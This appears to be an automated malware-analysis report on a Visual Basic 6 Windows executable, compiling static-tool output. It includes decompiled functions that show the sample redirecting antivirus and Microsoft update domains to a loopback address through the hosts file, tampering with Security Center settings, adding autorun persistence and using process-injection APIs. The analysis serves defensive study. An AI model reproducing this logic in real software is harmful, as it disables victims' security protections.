## Tool evidence (stage=deep_dive, signal-prioritized)
<!-- stage: deep_dive | sha=8059ade0d39e4c82 | packaging=v6.1 -->

## MalCat evidence
  File: type=PE, architecture=X86, entropy=135, sha256=8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075
  Anomalies (10): BoundImports (imports), InvalidChecksum (integrity), PossibleDownloaderApiDynamicImport (imports), PossiblePackerApiDynamicImport×5 (imports), StackArrayInitialisationX86×4 (code), UnknownOverlayMediumToHighEntropy (entropy), UnknownRootResourceDirectoryId (resources), UnparsedVersionInfo (resources), VBExternalApi×3 (imports), XorInLoop×2 (code)
  High-signal anomaly locations: XorInLoop@21773,22545
  YARA (signal): Wscript
  YARA (info, 7 total): MSVC_6_linker, VisualBasic, CreateRegistryEntryUsingBatch, AutorunKey, RunShell, ms_visual_basic_50_60_01, ms_visual_basic_50_01
  Functions (15): sub_408d80@36224, sub_405330@21296, sub_40a3ac@41900, sub_409380@37760, sub_40b800@47104, sub_40bda0@48544, sub_405f50@24400, sub_4058ae@22702, sub_40c970@51568, sub_407f40@32576, sub_407180@29056, sub_405cc0@23744, sub_4073e0@29664, sub_4082b0@33456, sub_407820@30752
  Top high-signal imports (score≥8, 2 of 125):
    [10] msvbvm60.__vbaAryDestruct ×26
    [10] advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorA ×2
  Mid-signal imports: kernel32.GetProcAddress, kernel32.LoadLibraryA
  (low-signal/noise imports: 121 omitted)
  ⚠ Constants/registry (1): registry::HKEY_LOCAL_MACHINE×2
  Strings/ips (64 total): 127.0.2.5\tliveu..veupdate.com\r\n, 127.0.2.5\tsecur..symantec.com\r\n, 127.0.2.5\twindo..icrosoft.com\r\n, 127.0.2.5\twww.n..sociates.com\r\n, 127.0.2.5\thouse..endmicro.com\r\n, 127.0.2.5\tcusto..symantec.com\r\n, 127.0.2.5\tnetwo..sociates.com\r\n, 127.0.2.5\tliveu..symantec.com\r\n, 127.0.2.5\twww.p..software.com\r\n, 127.0.2.5\tupdat..symantec.com\r\n, 127.0.2.5\tvirus..an.jotti.org\r\n, 127.0.2.5\twww.microsoft.com\r\n, 127.0.2.5\tdownl..d.mcafee.com\r\n, 127.0.2.5\tupdat..icrosoft.com\r\n, 127.0.2.5\tdispa..h.mcafee.com\r\n
  Strings/registry (3 total): HKCU\Software\Mi..rrentVersion\Run, SOFTWARE\Microso..\Policies\System, SOFTWARE\Microso..\Security Center
  Strings/paths (3 total): C:\WINDOWS\syste..rivers\etc\hosts, C:\Program Files..dio\VB98\VB6.OLB, @*\AC:\Users\Own..oad\Project1.vbp
  Strings/apis (31 total): ShellExecuteW, GetEnvironmentVariableW, NtAllocateVirtualMemory, NtSetContextThread, NtGetContextThread, RtlGetCurrentPeb, GetModuleFileNameA, FreeResource, CreateProcessW, FreeLibrary, CreateFolder, NtWriteVirtualMemory, WriteLine, NtResumeThread, NtDelayExecution
  Strings (other, 199 items, omitted)
  Carved files (12): DIB@19932 (744 bytes), DIB@20676 (296 bytes), DIB@66320 (1736 bytes), DIB@68056 (1864 bytes), DIB@69920 (2216 bytes), DIB@72136 (3240 bytes), DIB@75376 (1128 bytes), DIB@76504 (2440 bytes), DIB@78944 (4264 bytes), DIB@83208 (9640 bytes)
  Virtual files (14): ICO/1/unk, ICO/2/unk, ICO/3/unk, ICO/4/unk, ICO/5/unk, ICO/6/unk, ICO/7/unk, ICO/8/unk, ICO/30001/unk, ICO/30002/unk
  Recovered structures (98): MZ, RichHeader, PE, OptionalHeader, Sections, BoundImportTable, BoundImportNames, kernel32.FT, user32.FT, msvbvm60.FT, VBExternalTable, VBObj.Module1, VBObj.Module14, VBObj.Module2, VBObj.Module3
  Decompilations (3 top functions):
    ### 36224 (sub_408d80, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_408d80(void)

{
    code *pcVar1;
    code *pcVar2;
    int32_t iVar3;
    undefined4 *unaff_FS_OFFSET;
    int32_t iStack_80;
    undefined4 uStack_7c;
    undefined4 uStack_74;
    undefined4 uStack_6c;
    undefined4 uStack_64;
    undefined4 uStack_5c;
    undefined4 uStack_54;
    undefined4 uStack_4c;
    undefined4 uStack_44;
    undefined4 uStack_3c;
    undefined4 uStack_34;
    undefined4 uStack_2c;
    undefined4 *puStack_24;
    undefined4 uStack_1c;
    undefined4 uStack_18;
    undefined4 uStack_14;
    code *pcStack_10;
    undefined *puStack_c;
    undefined4 uStack_8;
    
    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_14 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_14;
    pcVar2 = msvbvm60.__vbaRedim;
    puStack_c = &stack0xffffff44;
    uStack_8 = 0x4013a8;
    uStack_18 = 0;
    uStack_1c = 0;
    uStack_2c = 0;
    uStack_3c = 0;
    uStack_4c = 0;
    uStack_5c = 0;
    uStack_6c = 0;
    uStack_7c = 0;
    iStack_80 = 0;
    (*msvbvm60.__vbaRedim)(0x880, 0x10, &uStack_1c, 0, 1, 3, 0);
    pcVar1 = msvbvm60.__vbaVarMove;
    puStack_24 = 0x11;
    uStack_2c = 2;
    (*msvbvm60.__vbaVarMove)();
    uStack_34 = 1;
    uStack_3c = 2;
    (*pcVar1)();
    uStack_4c = 2;
    uStack_44 = 1;
    (*pcVar1)();
    uStack_54 = 0;
    uStack_5c = 2;
    (*pcVar1)();
    func_0x004058c0("Ntdll.dll", "RtlAdjustPrivilege", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 2, 0);
    puStack_24 = 0x80000002;
    uStack_2c = 3;
    (*pcVar1)();
    uStack_34 = (*msvbvm60.VarPtr)("SOFTWARE\\Microsoft\\Security Center");
    uStack_3c = 3;
    (*pcVar1)();
    uStack_44 = (*msvbvm60.VarPtr)(&uStack_18);
    uStack_4c = 3;
    (*pcVar1)();
    iStack_80 = func_0x004058c0("advapi32.dll", "RegOpenKeyW", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    if (iStack_80 == 0) {
        (*pcVar2)(0x880, 0x10, &uStack_1c, 0,
```
    ### 21296 (sub_405330, score=?)
```c
/* WARNING: Removing unreachable block (ram,0x004056dc) */

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_405330(int16_t **param_1,uint32_t *param_2)

{
    int16_t *piVar1;
    code *pcVar2;
    code *pcVar3;
    undefined uVar4;
    int16_t iVar5;
    int32_t iVar6;
    uint32_t uVar7;
    int32_t iVar8;
    code **ppcVar9;
    undefined4 uVar10;
    int32_t iVar11;
    code *pcVar12;
    uint32_t uVar13;
    undefined4 *unaff_FS_OFFSET;
    bool bVar14;
    int32_t iVar15;
    uint32_t uStack_154;
    uint32_t uStack_150;
    undefined4 uStack_14c;
    uint32_t *puStack_148;
    code *pcStack_144;
    uint32_t *puStack_140;
    undefined4 uStack_13c;
    undefined4 uStack_138;
    undefined4 *puStack_134;
    uint32_t uStack_130;
    undefined4 uStack_12c;
    code *pcStack_128;
    uint32_t uStack_124;
    code *pcStack_120;
    undefined4 uStack_11c;
    code *pcStack_118;
    code **ppcStack_114;
    undefined4 *puStack_110;
    undefined4 uStack_10c;
    undefined **ppuStack_108;
    int16_t *piStack_104;
    undefined **ppuStack_100;
    code *pcStack_fc;
    undefined4 uStack_f8;
    undefined4 uStack_f4;
    undefined4 uStack_f0;
    int16_t **ppiStack_ec;
    uint32_t uStack_e8;
    undefined *puStack_e4;
    undefined4 uStack_e0;
    undefined4 uStack_dc;
    undefined *puStack_d8;
    undefined4 uStack_d4;
    undefined4 uStack_d0;
    uint32_t uStack_c0;
    uint32_t uStack_bc;
    undefined *puStack_8c;
    undefined *apuStack_88 [5];
    undefined4 auStack_74 [2];
    undefined4 uStack_6c;
    undefined4 uStack_64;
    undefined4 uStack_60;
    int32_t iStack_5c;
    undefined auStack_54 [12];
    int32_t iStack_48;
    undefined auStack_38 [12];
    int32_t iStack_2c;
    undefined4 uStack_20;
    uint32_t uStack_1c;
    uint32_t uStack_18;
    undefined4 uStack_14;
    code *pcStack_10;
    undefined *puStack_c;
    undefined4 uStack_8;
    
    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_14 = *unaff_FS_OFFSET;
    
```
    ### 41900 (sub_40a3ac, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_40a3ac(void)

{
    code *pcVar1;
    code *pcVar2;
    undefined4 uVar3;
    undefined4 *unaff_FS_OFFSET;
    undefined4 auStack_44 [2];
    undefined4 uStack_3c;
    undefined4 uStack_34;
    undefined4 auStack_30 [2];
    undefined4 uStack_28;
    undefined4 uStack_18;
    code *pcStack_14;
    undefined *puStack_10;
    undefined4 uStack_c;
    
    (*msvbvm60.__vbaErrorOverflow)();
    pcStack_14 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_18 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_18;
    puStack_10 = &stack0xfffffe90;
    uStack_c = 0x4013d0;
    uStack_28 = 0;
    auStack_30[0] = 0;
    uStack_34 = 0;
    uStack_3c = 0x80020004;
    auStack_44[0] = 10;
    (*msvbvm60.rtcFreeFile)(auStack_44);
    (*msvbvm60.__vbaFreeVar)();
    pcVar1 = msvbvm60.__vbaI2I4;
    uVar3 = (*msvbvm60.__vbaI2I4)("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
    (*msvbvm60.__vbaFileOpen)(2, 0xffffffff, uVar3);
    sub_40b640("127.0.2.5\\tsymantec.com\\r\\n");
    pcVar2 = msvbvm60.__vbaStrMove;
    (*msvbvm60.__vbaStrMove)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsecurityresponse.symantec.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsarc.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\twww.sarc.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (
```

## capa evidence (3 total, showing top 3)
  ATT&CK {'parts': ['Collection', 'Archive Collected Data', 'Archive via Library'], 'tactic': 'Collection', 'technique': 'Archive Collected Data', 'subtechnique': 'Archive via Library', 'id': 'T1560.002'} (1): compress data via WinAPI
  ATT&CK {'parts': ['Execution', 'Shared Modules'], 'tactic': 'Execution', 'technique': 'Shared Modules', 'subtechnique': '', 'id': 'T1129'} (1): link function at runtime on Windows
  All rules (1): compiled from Visual Basic

## pe_imports (103 imports, 2 high-signal)
  load_library (LoadLibrary) [T1129]
  get_proc_address (GetProcAddress) [T1129]

## YARA matches (17)
  Rules: domain, IP, contains_base64, Dropper_Strings, Misc_Suspicious_Strings, url, IsPE32, IsWindowsGUI, HasOverlay, HasRichSignature, Microsoft_Visual_Basic_v50v60, Microsoft_Visual_Basic_v50, Microsoft_Visual_Basic_v50_v60, Microsoft_Visual_Basic_v50_additional, Microsoft_Visual_Basic_v50v60_additional, SEH__vba, SEH_Init

## FLOSS strings (1249 total)
  paths (1): C:\Program Files (x86)\Microsoft Visual Studio\VB98\VB6.OLB
  base64 (1): ConvertStringSecurityDescriptorToSecurityDescriptorA
  apis (5): CallWindowProcA, RtlMoveMemory, GetProcAddress, LoadLibraryA, SetKernelObjectSecurity
  (other strings, 73 items omitted)

## dotnet_analyze
  (not a .NET assembly)


## radare2 (pdf (disasm)) — 5 functions (asm)
  ### 0x004017fc
```c
┌ 125: entry0 ();
│           0x004017fc      68881b4000     push 0x401b88
│           0x00401801      e8f0ffffff     call 0x4017f6
│           0x00401806      0000           add byte [eax], al
│           0x00401808      0000           add byte [eax], al
│           0x0040180a      0000           add byte [eax], al
│           0x0040180c      3000           xor byte [eax], al
│           0x0040180e      0000           add byte [eax], al
│           0x00401810      40             inc eax
│           0x00401811      0000           add byte [eax], al
│           0x00401813      0000           add byte [eax], al
│           0x00401815      0000           add byte [eax], al
│           0x00401817      0034ab         add byte [ebx + ebp*4], dh
│           0x0040181a      006cda2f       add byte [edx + ebx*8 + 0x2f], ch
│           0x0040181e      ec             in al, dx
│           0x0040181f      44             inc esp
│           0x00401820      81e1e1da20b8   and ecx, 0xb820dae1
│           0x00401826      55             push ebp
│           0x00401827      f20000         add byte [eax], al
│           0x0040182a      0000           add byte [eax], al
│           0x0040182c      0000           add byte [eax], al
│           0x0040182e      0100           add dword [eax], eax
│           0x00401830      0000           add byte [eax], al
│           0x00401832      2000           and byte [eax], al
│           0x00401834      0000           add byte [eax], al
│           0x00401836      40             inc eax
│           0x00401837      005072         add byte [eax + 0x72], dl
│           0x0040183a      6f             outsd dx, dword [esi]
│           0x0040183b      6a65           push 0x65                   ; 'e' ; 101
│           0x0040183d      63743100       arpl word [ecx + esi], si
│           0x00401841      008002000000   add byte [eax + 2], al
│           0x00401847      0000           add byte [eax], al
│           0x00401849      0000           add byte [eax], al
│           0x0040184b      0006           add byte [esi], al
│           0x0040184d      0000           add byte [eax], al
│           0x0040184f      00e4           add ah, ah
│           0x00401851      324000         xor al, byte [eax]
│           0x00401854      07             pop es
│           0x00401855      0000           add byte [eax], al
│           0x00401857      00c0           add al, al
│           0x00401859      304000         xor byte [eax], al
│           0x0040185c  
```
  ### 0x00401018
```c
┌ 1364: sym.imp.MSVBVM60.DLL___vbaVarTstGt ();
│ ╎╎╎╎╎╎╎   0x00401018      41             inc ecx
│ ╎╎╎╎╎╎╎   0x00401019      98             cwde
│ ╎╎╎╎╎╎╎   0x0040101a      a4             movsb byte es:[edi], byte [esi]
│ ╎╎╎╎╎╎└─< 0x0040101b  ~   7286           jb 0x400fa3
│ ╎╎╎╎╎╎    ;-- _CIcos:
..
│ ╎╎╎╎╎╎    0x0040101d      93             xchg ebx, eax
│ ╎╎╎╎╎╎    0x0040101e  ~   a372f909a3     mov dword [0xa309f972], eax ; [0xa309f972:4]=-1
│ ╎╎╎╎╎╎    ;-- _adj_fptan:
..
│ └───────< 0x00401023  ~   72ee           jb 0x401013
│  ╎╎╎╎╎    ;-- __vbaVarMove:
..
│  ╎╎╎╎╎    0x00401025      6aa4           push 0xffffffffffffffa4
│  ╎╎╎╎╎┌─< 0x00401027  ~   7237           jb sym.imp.MSVBVM60.DLL_rtcGetObject
│  ╎╎╎╎╎│   ;-- __vbaStrI4:
..
│  ╎╎╎╎╎│   ;-- (0x0040102c) __vbaVarVargNofree:
│  ╎╎╎╎╎│   0x00401029  ~   05a2728d72     add eax, 0x728d72a2
│  ╎╎╎╎╎│   0x0040102e      a4             movsb byte es:[edi], byte [esi]
│ ┌───────< 0x0040102f  ~   7244           jb 0x401075
│ │╎╎╎╎╎│   ;-- __vbaAryMove:
..
│ │╎╎╎╎╎│   0x00401031      c2a072         ret 0x72a0
..
│ │╎╎╎╎╎│   ;-- (0x0040103c) __vbaStrVarMove:
│ │╎╎╎╎╎│   ;-- __vbaLenBstr:
│ │╎╎╎╎ │   ;-- (0x00401048) __vbaPut3:
└ │╎╎╎╎┌──> 0x0040104e      a4             movsb byte es:[edi], byte [esi]
│ │╎╎│╎╎│   ;-- (0x00401050) _adj_fdiv_m64:
│ │╎╎└────< 0x0040104f  ~   72ba           jb 0x40100b
│ │╎╎ ╎╎│   ;-- (0x00401054) __vbaNextEachVar:
│ │╎╎ ╎╎│   0x00401051  ~   02a372bc63a4   add ah, byte [ebx - 0x5b9c438e]
│ │└──────< 0x00401057  ~   72b7           jb sym.imp.user32.dll_CallWindowProcA
│ │ ╎ ╎╎│   ;-- rtcAnsiValueBstr:
..
│ │ ╎ └───< 0x00401059      70a2           jo 0x400ffd
│ │ ╎  ╎│   ;-- (0x0040105c) _adj_fprem1:
│ │ ╎ ┌───< 0x0040105b  ~   7241           jb 0x40109e
│ │ ╎ │╎│   0x0040105d  ~   09a372ca9ca1   or dword [ebx - 0x5e63358e], esp
│ │ ╎ │╎│   ;-- rtcGetObject:
│ │ ╎ │╎└─> 0x00401060      ca9ca1         retf 0xa19c
│ │ ╎ │╎    ;-- (0x00401064) __vbaStrCat:
│ │ ╎┌──┌─> 0x00401063  ~   7276           jb 0x4010db
│ │ ╎││╎╎   0x00401065      6aa2           push 0xffffffffffffffa2
│ │ ╎││└──< 0x00401067  ~   72e5           jb 0x40104e
│ │ ╎││ ╎   ;-- __vbaLsetFixstr:
..
│ │ └─────< 0x00401069      76a2           jbe 0x40100d
│ │  ││ ╎   ;-- (0x0040106c) __vbaSetSystemError:
│ │  ││┌──< 0x0040106b  ~   723a           jb 0x4010a7
│ │  │││╎   0x0040106d      c3             ret
..
│ │ ││││╎   ;-- (0x00401078) __vbaAryVar:
│ └───────> 0x00401075  ~   02a3724039a4   add ah, byte [ebx - 0x5bc6
```
  ### 0x00401034
```c
┌ 28: sym.imp.MSVBVM60.DLL___vbaFreeVar ();
│       ╎   0x00401034      3168a4         xor dword [eax - 0x5c], ebp
│      ┌──< 0x00401037  ~   72ff           jb sym.imp.MSVBVM60.DLL___vbaGosubReturn
│      │╎   ;-- __vbaGosubReturn:
│      └──> 0x00401038      ff             invalid
│       ╎   ;-- (0x0040103c) __vbaStrVarMove:
│       ╎   0x00401039  ~   3ba4722919..   cmp esp, dword [edx + esi*2 + reloc.MSVBVM60.DLL___vbaStrVarMove]
│       ╎   ;-- __vbaLenBstr:
│       ╎   0x00401040      9b             wait
│       ╎   0x00401041      6aa2           push 0xffffffffffffffa2
│       └─< 0x00401043  ~   7288           jb 0x400fcd
│           ;-- __vbaEnd:
..
│           ;-- (0x00401048) __vbaPut3:
│           0x00401045  ~   bea072fa56     mov esi, 0x56fa72a0
└           0x0040104a  ~   a2726272a4     mov byte [0xa4726272], al   ; [0xa4726272:1]=255
│           ;-- __vbaFreeVarList:
..
```
  ### 0x00401070
```c
┌ 22: sym.imp.MSVBVM60.DLL___vbaHresultCheckObj (int32_t arg_40h);
│      ╎│   ; arg int32_t arg_40h @ ebp+0x40
│      ╎└─< 0x00401070      74a2           je 0x401014
│      ╎    ;-- (0x00401074) _adj_fdiv_m32:
│      ╎    0x00401072  ~   a1726e02a3     mov eax, dword [0xa3026e72] ; [0xa3026e72:4]=-1
│      ╎    ;-- (0x00401078) __vbaAryVar:
..
│      ╎┌─< 0x00401077  ~   7240           jb 0x4010b9
│      ╎│   ;-- __vbaAryVar:
..
│      ╎│   0x00401079  ~   39a472fec1..   cmp dword [edx + esi*2 + reloc.MSVBVM60.DLL___vbaAryDestruct], esp
│      ╎│   ;-- (0x0040107c) __vbaAryDestruct:
..
│   │╎╎╎│   ;-- rtcRandomNext:
│ │╎ ╎╎╎│   ;-- (0x0040108c) rtcMsgBox:
│ │╎│╎╎╎│   ;-- (0x00401094) _adj_fdiv_m16i:
│ │╎│╎╎╎│   ;-- (0x0040109c) _adj_fdivr_m16i:
│ │╎│╎╎╎│   ;-- (0x004010a0) __vbaVarTstLt:
│ │╎│╎╎╎│   ;-- (0x004010a4) _CIsin:
│ │╎│╎╎╎│   ;-- (0x004010b8) __vbaGosubFree:
│ │╎│╎╎╎└─> 0x004010b9  ~   3ca4           cmp al, 0xa4                ; 164
..
│ │╎ ╎╎╎╎   ;-- (0x004010c4) __vbaGenerateBoundsError:
│  ╎││╎ ╎   ;-- (0x004010d4) __vbaAryConstruct2:
│  │  ╎ ╎   ;-- (0x004010dc) __vbaObjVar:
│     ╎╎╎   ;-- (0x004010e8) __vbaRedimPreserve:
│    │╎╎╎   ;-- (0x004010ec) _adj_fpatan:
│  ╎││ │╎   ;-- (0x00401100) __vbaUI1I2:
│  ╎ │  ╎   ;-- __vbaExceptHandler:
```
  ### 0x004010d8
```c
┌ 7: sym.imp.MSVBVM60.DLL___vbaCyI4 (int32_t arg_40h);
│           ; arg int32_t arg_40h @ ebp+0x40
│           0x004010d8      b119           mov cl, 0x19                ; 25
└           0x004010da  ~   a272a9a1a1     mov byte [0xa1a1a972], al   ; [0xa1a1a972:1]=255
│           ;-- (0x004010dc) __vbaObjVar:
..
```

## UPX
  (not packed)


## xorsearch (1 candidates)
  Found XOR 00 position 00000000: 000000C0 ........!..L.!This program cannot be r

<!-- evidence_assembler: used 18431/60000 chars across 9 tools -->